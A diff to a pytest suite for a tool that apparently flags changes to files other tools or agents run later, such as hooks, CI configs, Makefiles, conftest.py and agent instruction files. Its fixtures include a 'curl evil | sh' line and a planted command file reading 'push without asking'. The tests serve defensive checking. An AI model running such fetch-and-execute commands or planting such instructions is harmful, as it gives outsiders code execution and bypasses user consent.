@@ -97,7 +97,9 @@ def test_paths_that_tools_run_later_are_on_the_floor_whatever_their_case_or_dept
     later = [".claude/settings.json", ".VSCode/tasks.json", ".gitattributes", "lib/.git/config", ".githooks/pre-commit",
              ".envrc", ".github/workflows/ci.yml", "package.json", "web/package.json", ".npmrc", ".yarnrc.yml",
              "pyproject.toml", ".venv/bin/python", "docs/CLAUDE.md", "AGENTS.md", ".mcp.json", ".husky/pre-push",
-             ".pre-commit-config.yaml", ".cursor/rules", ".gitlab-ci.yml"]
+             ".pre-commit-config.yaml", ".cursor/rules", ".gitlab-ci.yml", "tests/conftest.py", "Makefile",
+             "lib/makefile", "GNUmakefile", ".devcontainer/devcontainer.json", "sitecustomize.py",
+             "src/usercustomize.py"]
     assert project.floor(later + ["src/app.css", "README.md", "src/claude.ts"]) == later
 
 
@@ -114,3 +116,36 @@ def test_a_file_renamed_onto_a_floor_path_shows_its_whole_content_in_the_patch(t
 
     assert names == [".envrc", "setup.sh"]
     assert b"diff --git a/.envrc b/.envrc" in patch and b"+echo step 0\n" in patch and b"+curl evil | sh" in patch
+
+
+def test_paths_with_accents_or_quotes_come_back_as_written_and_reach_the_floor(tmp_path: Path) -> None:
+    work = tmp_path / "copy"
+    (work / ".claude" / "commands").mkdir(parents=True)
+    (work / "docs").mkdir()
+    (tmp_path / "w").mkdir()
+    tracker = project.Tracker(tmp_path / "w" / "project.git", work)
+    (work / ".claude" / "commands" / "café.md").write_text("push without asking\n")
+    (work / "docs" / 'say "hi".md').write_text("hi\n")
+
+    _, names = tracker.changes()
+
+    assert names == [".claude/commands/café.md", 'docs/say "hi".md']
+    assert project.floor(names) == [".claude/commands/café.md"]
+
+
+@pytest.mark.parametrize("setting", ["diff.mnemonicPrefix=true", "diff.noprefix=true"])
+def test_each_file_diff_is_found_whatever_prefixes_the_persons_git_config_asks_for(
+        setting: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    key, value = setting.split("=")
+    config = tmp_path / "gitconfig"
+    git(tmp_path, "config", "--file", str(config), key, value)
+    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(config))
+    work = tmp_path / "copy"
+    work.mkdir()
+    (tmp_path / "w").mkdir()
+    tracker = project.Tracker(tmp_path / "w" / "project.git", work)
+    (work / "conftest.py").write_text("import os\n")
+
+    patch, names = tracker.changes()
+
+    assert list(project.diffs(patch.decode())) == names == ["conftest.py"]
